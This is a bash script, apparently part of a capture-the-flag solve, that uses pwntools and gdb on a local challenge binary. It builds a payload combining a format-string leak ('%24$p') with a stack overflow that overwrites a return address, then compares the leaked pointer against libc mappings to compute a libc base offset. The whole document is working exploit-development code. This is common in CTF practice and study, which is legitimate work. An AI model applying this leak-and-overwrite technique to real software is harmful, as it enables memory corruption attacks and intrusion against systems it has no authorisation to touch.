#!/bin/bash
cd /work/waf/waf
python3 - <<'PY'
from pwn import *
p=b"exit"+b"[%24$p]"
p=p.ljust(88,b"A")+p64(0x4010d4)
open("/tmp/pl.bin","wb").write(p)
PY
cat > /tmp/gs <<'EOF'
set pagination off
break *0x401373
run < /tmp/pl.bin
finish
EOF
# Simpler: break at ret, single-step into printf, let it print, then read maps at that moment.
cat > /tmp/gs <<'EOF'
set pagination off
break *0x401373
run < /tmp/pl.bin
info proc mappings
EOF
gdb -q -batch -x /tmp/gs ./chal_remote > /tmp/g.txt 2>&1
python3 - <<'PY'
import re
txt=open("/tmp/g.txt").read()
# libc base
base=None
for l in txt.splitlines():
    if "libc.so.6" in l:
        m=re.search(r"0x[0-9a-f]+", l)
        if m:
            b=int(m.group(0),16); base=b if base is None else min(base,b)
print("libc_base(gdb)=",hex(base) if base else None)
print("expected %24$p = base + 0x2CD65 =", hex(base+0x2CD65) if base else None)
PY
# Now actually capture %24$p output by running normally
python3 - <<'PY'
import os,time,re
os.environ["TERM"]="xterm"
from pwn import *
context.log_level="error"
p=process("./chal_remote")
p.recvuntil(b">> ")
p.send((b"exit[%24$p]").ljust(88,b"A")+p64(0x4010d4)); time.sleep(0.15)
base=None
try:
    for l in open(f"/proc/{p.pid}/maps"):
        if "libc.so.6" in l:
            b=int(l.split('-')[0],16); base=b if base is None else min(base,b)
except: pass
out=p.recv(timeout=0.6); p.close()
m=re.search(rb"\[(0x[0-9a-f]+)\]",out)
if m and base:
    v=int(m.group(1),16)
    print("run: %24$p=",hex(v),"base=",hex(base),"OFFSET=",hex(v-base))
PY
